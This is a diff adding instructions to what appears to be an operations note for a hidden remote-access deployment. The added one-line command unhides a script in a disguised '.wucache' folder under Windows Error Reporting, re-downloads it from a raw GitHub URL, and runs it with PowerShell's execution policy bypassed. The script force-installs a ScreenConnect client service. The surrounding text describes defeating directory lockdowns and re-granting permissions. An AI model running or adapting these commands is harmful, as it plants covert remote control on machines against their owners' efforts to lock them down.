@@ -10,3 +10,10 @@ O49/M35 guarantee:
 - All downloads staged in C:\Windows\Temp\.upd (never ACL-locked), then moved into .wucache — LockDir cannot freeze the update channel.
 - Every mon tick unhardens the workdir + re-grants SYSTEM/Admin before attempting self-update.
 Net: any host that runs a tick OR a deploy converges to the latest build, whatever its prior state.
+
+GRYXA-ONLY FORCE FIX (L33 — use when mon is alive but gryxa is stuck: service missing, 1603/ProductCode-collision, or inflight=1 loop). Pulls L33 lib from cache-busted raw, clears stale wrapper, forces ensure:
+attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" 2>nul & curl.exe -L --ssl-no-revoke -o "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?nocache=%RANDOM%%RANDOM%" & findstr /C:"OWN_LIB  BUILD 20260802L33" "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" & del /f /q "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\gryxa_install.cmd" 2>nul & powershell -NoProfile -ExecutionPolicy Bypass -File "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" -Build FORCEPUSH
+
+Then wait ~60s and verify:  sc query "ScreenConnect Client (36e506ff016b2151)"   → want STATE RUNNING.
+
+L33 note: the 1603 was a cross-FP ProductCode collision (old 9908198e + new 36e506ff share ProductCode {9D7CC418-...}); /i hit maintenance mode and failed. L33 /x's the ProductCode before /i so it's a clean INSTALL. Any host that pulls L33 auto-fixes on its next gryxa-ensure tick — no manual /x needed.
